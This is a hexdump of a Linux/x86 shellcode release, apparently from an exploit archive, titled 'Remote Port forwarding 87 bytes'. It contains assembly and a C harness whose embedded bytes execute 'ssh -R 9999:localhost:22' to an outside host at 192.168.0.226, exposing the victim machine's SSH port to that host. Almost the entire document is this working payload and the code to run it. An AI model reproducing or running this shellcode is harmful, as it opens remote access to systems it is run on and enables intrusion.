00000000  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00000030  2a 2a 2a 2a 2a 0d 0a 2a  20 4c 69 6e 75 78 2f 78  |*****..* Linux/x|
00000040  38 36 20 52 65 6d 6f 74  65 20 50 6f 72 74 20 66  |86 Remote Port f|
00000050  6f 72 77 61 72 64 69 6e  67 20 38 37 20 62 79 74  |orwarding 87 byt|
00000060  65 73 20 20 20 20 20 20  20 20 20 2a 0d 0a 2a 20  |es         *..* |
00000070  73 73 68 20 2d 52 20 39  39 39 39 3a 6c 6f 63 61  |ssh -R 9999:loca|
00000080  6c 68 6f 73 74 3a 32 32  20 31 39 32 2e 31 36 38  |lhost:22 192.168|
00000090  2e 30 2e 32 32 36 20 20  20 20 20 20 20 20 20 20  |.0.226          |
000000a0  20 20 2a 0d 0a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |  *..***********|
000000b0  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
000000d0  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 0d 0a 2a 20 41 75  |**********..* Au|
000000e0  74 68 6f 72 3a 20 48 61  6d 7a 61 20 4d 65 67 61  |thor: Hamza Mega|
000000f0  68 65 64 20 20 20 20 20  20 20 20 20 20 20 20 20  |hed             |
00000100  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000110  2a 0d 0a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |*..*************|
00000120  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00000140  2a 2a 2a 2a 2a 2a 2a 2a  0d 0a 2a 20 54 77 69 74  |********..* Twit|
00000150  74 65 72 3a 20 40 48 61  6d 7a 61 5f 4d 65 67 61  |ter: @Hamza_Mega|
00000160  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000170  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2a 0d  |              *.|
00000180  0a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |.***************|
00000190  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
000001b0  2a 2a 2a 2a 2a 2a 0d 0a  2a 20 62 6c 6f 67 3a 20  |******..* blog: |
000001c0  68 61 6d 7a 61 2d 6d 65  67 61 5b 64 6f 74 5d 62  |hamza-mega[dot]b|
000001d0  6c 6f 67 73 70 6f 74 5b  64 6f 74 5d 63 6f 6d 20  |logspot[dot]com |
000001e0  20 20 20 20 20 20 20 20  20 20 20 20 2a 0d 0a 2a  |            *..*|
000001f0  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00000220  2a 2a 2a 2a 0d 0a 2a 20  45 2d 6d 61 69 6c 3a 20  |****..* E-mail: |
00000230  68 61 6d 7a 61 5b 64 6f  74 5d 6d 65 67 61 68 65  |hamza[dot]megahe|
00000240  64 5b 61 74 5d 67 6d 61  69 6c 5b 64 6f 74 5d 63  |d[at]gmail[dot]c|
00000250  6f 6d 20 20 20 20 20 20  20 20 2a 0d 0a 2a 2a 2a  |om        *..***|
00000260  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00000290  2a 2a 0d 0a 0d 0a 78 6f  72 20 20 20 20 25 65 61  |**....xor    %ea|
000002a0  78 2c 25 65 61 78 0d 0a  70 75 73 68 20 20 20 25  |x,%eax..push   %|
000002b0  65 61 78 0d 0a 70 75 73  68 6c 20 20 24 30 78 33  |eax..pushl  $0x3|
000002c0  36 33 32 33 32 32 65 0d  0a 70 75 73 68 6c 20 20  |632322e..pushl  |
000002d0  24 30 78 33 30 33 30 32  65 33 38 0d 0a 70 75 73  |$0x30302e38..pus|
000002e0  68 6c 20 20 24 30 78 33  36 33 31 32 65 33 32 0d  |hl  $0x36312e32.|
000002f0  0a 70 75 73 68 77 20 20  24 30 78 33 39 33 31 0d  |.pushw  $0x3931.|
00000300  0a 6d 6f 76 6c 20 20 20  25 65 73 70 2c 25 65 73  |.movl   %esp,%es|
00000310  69 0d 0a 70 75 73 68 20  20 20 25 65 61 78 0d 0a  |i..push   %eax..|
00000320  70 75 73 68 20 20 20 24  30 78 33 32 33 32 33 61  |push   $0x32323a|
00000330  37 34 0d 0a 70 75 73 68  20 20 20 24 30 78 37 33  |74..push   $0x73|
00000340  36 66 36 38 36 63 0d 0a  70 75 73 68 20 20 20 24  |6f686c..push   $|
00000350  30 78 36 31 36 33 36 66  36 63 0d 0a 70 75 73 68  |0x61636f6c..push|
00000360  20 20 20 24 30 78 33 61  33 39 33 39 33 39 0d 0a  |   $0x3a393939..|
00000370  70 75 73 68 77 20 20 24  30 78 33 39 33 30 0d 0a  |pushw  $0x3930..|
00000380  6d 6f 76 6c 20 20 20 25  65 73 70 2c 25 65 62 70  |movl   %esp,%ebp|
00000390  0d 0a 70 75 73 68 20 20  20 25 65 61 78 0d 0a 70  |..push   %eax..p|
000003a0  75 73 68 77 20 20 24 30  78 35 32 32 64 0d 0a 6d  |ushw  $0x522d..m|
000003b0  6f 76 6c 20 20 20 25 65  73 70 2c 25 65 64 69 0d  |ovl   %esp,%edi.|
000003c0  0a 70 75 73 68 20 20 20  25 65 61 78 0d 0a 70 75  |.push   %eax..pu|
000003d0  73 68 20 20 20 24 30 78  36 38 37 33 37 33 32 66  |sh   $0x6873732f|
000003e0  0d 0a 70 75 73 68 20 20  20 24 30 78 36 65 36 39  |..push   $0x6e69|
000003f0  36 32 32 66 0d 0a 70 75  73 68 20 20 20 24 30 78  |622f..push   $0x|
00000400  37 32 37 33 37 35 32 66  0d 0a 6d 6f 76 6c 20 20  |7273752f..movl  |
00000410  20 25 65 73 70 2c 25 65  62 78 0d 0a 70 75 73 68  | %esp,%ebx..push|
00000420  20 20 20 25 65 61 78 0d  0a 70 75 73 68 20 20 20  |   %eax..push   |
00000430  25 65 73 69 0d 0a 70 75  73 68 20 20 20 25 65 62  |%esi..push   %eb|
00000440  70 0d 0a 70 75 73 68 20  20 20 25 65 64 69 0d 0a  |p..push   %edi..|
00000450  70 75 73 68 20 20 20 25  65 62 78 0d 0a 6d 6f 76  |push   %ebx..mov|
00000460  6c 20 20 20 25 65 73 70  2c 25 65 63 78 0d 0a 6d  |l   %esp,%ecx..m|
00000470  6f 76 20 20 20 20 24 30  78 62 2c 25 61 6c 0d 0a  |ov    $0xb,%al..|
00000480  69 6e 74 20 20 20 20 24  30 78 38 30 0d 0a 0d 0a  |int    $0x80....|
00000490  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
000004b0  0d 0a 23 69 6e 63 6c 75  64 65 20 3c 73 74 64 69  |..#include <stdi|
000004c0  6f 2e 68 3e 0d 0a 23 69  6e 63 6c 75 64 65 20 3c  |o.h>..#include <|
000004d0  73 74 72 69 6e 67 2e 68  3e 0d 0a 20 0d 0a 63 68  |string.h>.. ..ch|
000004e0  61 72 20 2a 73 68 65 6c  6c 63 6f 64 65 20 3d 20  |ar *shellcode = |
000004f0  0d 0a 22 5c 78 33 31 5c  78 63 30 5c 78 35 30 5c  |.."\x31\xc0\x50\|
00000500  78 36 38 5c 78 32 65 5c  78 33 32 5c 78 33 32 5c  |x68\x2e\x32\x32\|
00000510  78 33 36 5c 78 36 38 5c  78 33 38 5c 78 32 65 5c  |x36\x68\x38\x2e\|
00000520  78 33 30 5c 78 33 30 5c  78 36 38 5c 78 33 32 5c  |x30\x30\x68\x32\|
00000530  78 32 65 5c 78 33 31 5c  78 33 36 22 0d 0a 22 5c  |x2e\x31\x36".."\|
00000540  78 36 36 5c 78 36 38 5c  78 33 31 5c 78 33 39 5c  |x66\x68\x31\x39\|
00000550  78 38 39 5c 78 65 36 5c  78 35 30 5c 78 36 38 5c  |x89\xe6\x50\x68\|
00000560  78 37 34 5c 78 33 61 5c  78 33 32 5c 78 33 32 5c  |x74\x3a\x32\x32\|
00000570  78 36 38 5c 78 36 63 5c  78 36 38 5c 78 36 66 5c  |x68\x6c\x68\x6f\|
00000580  78 37 33 5c 78 36 38 22  0d 0a 22 5c 78 36 63 5c  |x73\x68".."\x6c\|
00000590  78 36 66 5c 78 36 33 5c  78 36 31 5c 78 36 38 5c  |x6f\x63\x61\x68\|
000005a0  78 33 39 5c 78 33 39 5c  78 33 39 5c 78 33 61 5c  |x39\x39\x39\x3a\|
000005b0  78 36 36 5c 78 36 38 5c  78 33 30 5c 78 33 39 5c  |x66\x68\x30\x39\|
000005c0  78 38 39 5c 78 65 35 5c  78 35 30 5c 78 36 36 5c  |x89\xe5\x50\x66\|
000005d0  78 36 38 22 0d 0a 22 5c  78 32 64 5c 78 35 32 5c  |x68".."\x2d\x52\|
000005e0  78 38 39 5c 78 65 37 5c  78 35 30 5c 78 36 38 5c  |x89\xe7\x50\x68\|
000005f0  78 32 66 5c 78 37 33 5c  78 37 33 5c 78 36 38 5c  |x2f\x73\x73\x68\|
00000600  78 36 38 5c 78 32 66 5c  78 36 32 5c 78 36 39 5c  |x68\x2f\x62\x69\|
00000610  78 36 65 5c 78 36 38 5c  78 32 66 5c 78 37 35 22  |x6e\x68\x2f\x75"|
00000620  0d 0a 22 5c 78 37 33 5c  78 37 32 5c 78 38 39 5c  |.."\x73\x72\x89\|
00000630  78 65 33 5c 78 35 30 5c  78 35 36 5c 78 35 35 5c  |xe3\x50\x56\x55\|
00000640  78 35 37 5c 78 35 33 5c  78 38 39 5c 78 65 31 5c  |x57\x53\x89\xe1\|
00000650  78 62 30 5c 78 30 62 5c  78 63 64 5c 78 38 30 22  |xb0\x0b\xcd\x80"|
00000660  3b 0d 0a 0d 0a 0d 0a 0d  0a 20 0d 0a 69 6e 74 20  |;........ ..int |
00000670  6d 61 69 6e 28 76 6f 69  64 29 0d 0a 7b 0d 0a 66  |main(void)..{..f|
00000680  70 72 69 6e 74 66 28 73  74 64 6f 75 74 2c 22 4c  |printf(stdout,"L|
00000690  65 6e 67 74 68 3a 20 25  64 5c 6e 22 2c 73 74 72  |ength: %d\n",str|
000006a0  6c 65 6e 28 73 68 65 6c  6c 63 6f 64 65 29 29 3b  |len(shellcode));|
000006b0  0d 0a 28 2a 28 76 6f 69  64 28 2a 29 28 29 29 20  |..(*(void(*)()) |
000006c0  73 68 65 6c 6c 63 6f 64  65 29 28 29 3b 0d 0a 72  |shellcode)();..r|
000006d0  65 74 75 72 6e 20 30 3b  0d 0a 7d                 |eturn 0;..}|
000006db
